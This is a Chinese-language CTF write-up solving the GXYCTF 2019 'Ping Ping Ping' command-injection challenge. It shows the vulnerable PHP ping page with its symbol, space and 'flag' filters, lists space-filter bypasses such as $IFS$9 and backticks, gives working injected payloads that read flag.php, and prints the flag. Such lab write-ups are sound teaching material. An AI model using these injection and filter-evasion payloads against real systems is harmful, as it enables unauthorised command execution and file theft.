---
title: "Web 13 [GXYCTF 2019]Ping Ping Ping"
published: 2025-01-11
category: CTF
---

![](https://pic.npiter.de/file/1771550987889_20260220092942756.png)

> ping的题目，看了一些知识点拿来练练

![](https://pic.npiter.de/file/1771550996562_20260220092942757.png)

> 先来随便ping一下

```
127.0.0.1

```

得到

![](https://pic.npiter.de/file/1771550996102_20260220092942758.png)

> 再尝试一下添加管道符加其他指令

![](https://pic.npiter.de/file/1771551001142_20260220092942759.png)

> [!IMPORTANT]
>
>
> 发现目录下有两个php文件，有我们需要的flag

> 尝试能不能获取flag

ping `127.0.0.1|cat flag.php`

![](https://pic.npiter.de/file/1771551009695_20260220092942760.png)

> **发现可能是空格被过滤了**

尝试其他的常见绕过方法

**比如**

- 使用 `${IFS}` 代替空格

- 使用 `` 重定向符号

- 使用` {cat,flag.php}` 语法

- 使用 `$()` 或反引号执行命令

- 使用 `%09（Tab 字符）`代替空格

都会被过滤

贴张图

![](https://pic.npiter.de/file/1771551006585_20260220092942761.png)

#### 法一

> [!TIP]
>
>
> 使用$IFS$9绕过

> 先看看index.php里面源码写了啥

查看源码

```php
	|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
			print_r($match);
			print($ip);
			echo preg_match("/\&|\/|\?|\*|\|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
			die("fxck your symbol!");
		}
		else if(preg_match("/ /", $ip)){
			die("fxck your space!");
		}
		else if(preg_match("/bash/", $ip)){
			die("fxck your bash!");
		}
		else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
			die("fxck your flag!");
		}
		$a = shell_exec("ping -c 4 ".$ip);
		echo "";
		print_r($a);
	}

	?>

```

> [!important]
>
>
> 源码里面有过滤规则
>
>
>
>
> - /.*f.*l.*a.*g.*/只要匹配到这四个字符组合在一起就显示fxck your flag!了
>
> - 可以采取变量赋值的方式来做

输入 ping `127.0.0.1;q=g;cat$IFS$9fla$q.php`

再次查看源码

![](https://pic.npiter.de/file/1771551011885_20260220092942762.png)

拿到flag

**NSSCTF{9cd25729-d16e-462c-976d-c4a5cb055b8b}**

#### 法二

> [!TIP]
>
>
> 这个方法比较巧妙
>
>
> ***使用反引号绕过***
>
>
> ==**原理：**==
>
>
> **linux下，会先执行反引号下面的语句
> 在这里会执行ls,ls的结果是“index.php flag.php”
> 所以最后执行的语句等价于
> cat index.php flag.php**

试验一下

ping一下

![](https://pic.npiter.de/file/1771551021063_20260220092942763.png)

也是成功拿到flag

![](https://pic.npiter.de/file/1771551017006_20260220092942764.png)
